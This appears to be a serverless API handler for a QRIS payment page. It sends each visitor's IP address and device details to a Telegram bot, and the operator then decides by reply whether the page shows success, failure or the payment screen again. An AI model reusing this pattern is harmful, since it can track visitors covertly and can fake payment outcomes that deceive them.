global.statusMode = global.statusMode || "waiting";
global.expireAt = global.expireAt || null;

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  const name = req.body?.name || "User Anonim";
  const device = req.body?.device || "Device Tidak Diketahui";
  
  // Deteksi Alamat IP Pengguna secara akurat melalui request headers
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";

  // Set Waktu Expire State Loading di Server selama 8 Menit (480.000 ms)
  global.statusMode = "loading";
  global.expireAt = Date.now() + (8 * 60 * 1000);

  const pesan = `⚠️ *Pengguna Kembali ke Halaman Web (Loading)*\n\n` +
                `👤 Nama Acak: *${name}*\n` +
                `📱 Tipe Perangkat: *${device}*\n` +
                `🌐 Alamat IP: *${ip}*\n\n` +
                `⏳ *Timer Otomatis Bot:* 8 Menit berjalan.\n` +
                `Gunakan perintah balasan:\n` +
                `• *kirim* : Konfirmasi Sukses\n` +
                `• *stop* : Kembalikan ke QRIS\n` +
                `• *gagal* : Buat Tampilan Gagal`;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: "Markdown" })
  });

  res.status(200).json({ success: true });
}

